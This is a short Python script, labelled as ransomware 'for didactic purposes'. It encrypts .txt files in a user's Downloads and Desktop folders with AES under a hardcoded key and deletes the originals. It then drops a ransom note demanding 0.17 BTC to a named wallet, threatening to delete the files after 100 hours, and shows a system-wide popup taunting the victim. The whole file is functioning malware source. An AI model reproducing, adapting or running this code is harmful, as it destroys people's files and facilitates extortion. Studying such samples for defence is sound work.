"""
Ransomware - 0.0.0.0

By Carlos Henrique Barros Silva Campos

OBS: Script para total didática.
"""
import os
import glob
import time
import pyaes
from pathlib import Path
#a=argv[1]
lst_arq = ["*.txt"]
lst_past = ["Downloads","Desktop","C:"]


print('Criptografando')
time.sleep(3)

def txt():
    msg=open(f'{y}\\LEIA.txt','w+')
    msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
    msg.writelines("ALL YOUR FILES HAVE BEEN ENCRYPTED. \nAND IN 100 HRS THEY WILL BE DELETED.")
    msg.writelines("SO THAT DOES NOT HAPPEN SEND 0.17BTC TO OUR WALLET: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX.")
    msg.writelines("\n\nWE ARE ANONYMOUS.\nWE ARE LEGION.\nWE DO NOT FORGIVE\nWE DO NOT FORGET.\nEXPECT US")
    msg.close()

def criptografando():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

for i in lst_past:
    try:
        desktop = Path.home() / i
    except Exception:
        pass
    os.chdir(desktop)
    criptografando()
y = Path.home() / "Desktop"
os.chdir(y)
txt()
h=9
while h<10:
    os.system('msg * YOU HAVE BEEN INFECTED BY CORONADARK. WE LEAVE A FILE ON THE WORK AREA FOR YOU KAKAKAKA.')
    h=h+1